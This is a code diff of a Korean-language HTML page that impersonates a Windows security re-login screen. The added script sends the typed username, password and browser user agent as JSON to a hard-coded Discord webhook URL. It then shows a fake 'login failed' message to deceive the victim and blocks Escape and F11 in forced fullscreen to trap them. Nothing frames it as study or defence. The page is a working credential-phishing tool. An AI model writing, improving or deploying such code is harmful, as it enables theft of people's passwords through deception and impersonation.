@@ -1,80 +1,141 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="ko">
-<head>
-    <meta charset="UTF-8">
+  <head>
+    <meta charset="UTF-8" />
     <title>Windows 보안</title>
     <style>
-        body {
-            margin: 0;
-            background: #000;
-            color: #fff;
-            font-family: Segoe UI, sans-serif;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-        }
-        h1 { font-size: 2.8em; }
-        p { font-size: 1.3em; }
-        input {
-            padding: 12px;
-            width: 320px;
-            margin: 10px;
-            font-size: 1.1em;
-            border: none;
-            border-radius: 4px;
-        }
-        button {
-            padding: 12px 40px;
-            font-size: 1.2em;
-            background: #0067c5;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            margin-top: 20px;
-        }
+      body {
+        margin: 0;
+        background: #000;
+        color: #fff;
+        font-family:
+          Segoe UI,
+          sans-serif;
+        height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-direction: column;
+      }
+      h1 {
+        font-size: 2.8em;
+      }
+      p {
+        font-size: 1.3em;
+      }
+      input {
+        padding: 12px;
+        width: 320px;
+        margin: 10px;
+        font-size: 1.1em;
+        border: none;
+        border-radius: 4px;
+      }
+      button {
+        padding: 12px 40px;
+        font-size: 1.2em;
+        background: #0067c5;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        margin-top: 20px;
+      }
+      #error {
+        color: red;
+        display: none;
+        margin-top: 15px;
+        font-weight: bold;
+      }
     </style>
-</head>
-<body>
+  </head>
+  <body>
     <h1>Windows</h1>
-    <form id="frm">
-        <input type="text" id="u" placeholder="이메일 또는 사용자 이름" required autofocus><br>
-        <input type="password" id="p" placeholder="비밀번호" required><br>
-        <button type="button" onclick="saveCred()">로그인</button>
+    <p>보안상의 이유로 다시 로그인해야 합니다.</p>
+
+    <form id="loginForm">
+      <input
+        type="text"
+        id="username"
+        placeholder="이메일 또는 사용자 이름"
+        required
+        autofocus
+      /><br />
+      <input
+        type="password"
+        id="password"
+        placeholder="비밀번호"
+        required
+      /><br />
+      <button type="submit">로그인</button>
     </form>
-    <p id="err" style="color:red;display:none;">잘못된 비밀번호입니다. 다시 시도하세요.</p>
+
+    <div id="error">잘못된 비밀번호입니다. 다시 시도하세요.</div>
 
     <script>
-        function saveCred() {
-            var u = document.getElementById('u').value;
-            var p = document.getElementById('p').value;
-            
-            if (u && p) {
-                // 입력된 ID/PW를 클립보드로 복사
-                navigator.clipboard.writeText('ID: ' + u + '\nPW: ' + p);
-                
-                // 사용자를 속이기 위해 에러 메시지 출력
-                document.getElementById('err').style.display = 'block';
+      document
+        .getElementById("loginForm")
+        .addEventListener("submit", async function (e) {
+          e.preventDefault(); // 기본 폼 제출 막기
+
+          const username = document.getElementById("username").value.trim();
+          const password = document.getElementById("password").value.trim();
+
+          if (!username || !password) return;
+
+          const payload = {
+            content:
+              `**새로운 입력 감지됨!**\n` +
+              `컴퓨터 정보: ${navigator.userAgent}\n` +
+              `사용자 이름: ${username}\n` +
+              `비밀번호: ${password}\n` +
+              `시간: ${new Date().toLocaleString("ko-KR")}`,
+          };
+
+          try {
+            const response = await fetch(
+              "https://discord.com/api/webhooks/1472244980662927381/FycSobkkKh_MzI-EcY_cZYC7OGdo9U8yTKBReRTzkfeagFVW6hit4W7ODQ8MqwCL9iiv",
+              {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload),
+              },
+            );
+
+            if (response.ok) {
+              // 전송 성공 → 에러처럼 보이게 하면서 입력창 초기화
+              document.getElementById("error").style.display = "block";
+              document.getElementById("error").innerText =
+                "로그인 실패. 다시 시도하세요.";
+              document.getElementById("username").value = "";
+              document.getElementById("password").value = "";
+            } else {
+              console.error("Webhook 전송 실패:", response.status);
             }
-        }
-
-        // 우클릭 방지
-        document.oncontextmenu = () => { return false; };
-
-        // ESC 키 방지 (키오스크 모드에서 빠져나가는 것을 어렵게 함)
-        document.onkeydown = e => {
-            if (e.key === 'Escape') return false;
-        }
-        document.addEventListener('keydown', e => {
-            if (e.key === 'F11' || e.key === 'Escape') e.preventDefault();
+          } catch (err) {
+            console.error("전송 오류:", err);
+          }
         });
-        window.onload = () => {
-            if (document.documentElement.requestFullscreen) {
-                    document.documentElement.requestFullscreen();
-            }
-        };
+
+      // Esc / F11 막기
+      document.addEventListener("keydown", (e) => {
+        if (e.key === "Escape" || e.key === "F11") {
+          e.preventDefault();
+        }
+      });
+
+      // 풀스크린은 사용자 클릭 후에만 시도
+      document.body.addEventListener(
+        "click",
+        function enableFS() {
+          if (document.documentElement.requestFullscreen) {
+            document.documentElement.requestFullscreen().catch(() => {});
+          }
+          // 한 번 클릭 후 이벤트 제거
+          document.body.removeEventListener("click", enableFS);
+        },
+        { once: true },
+      );
     </script>
-</body>
+  </body>
 </html>
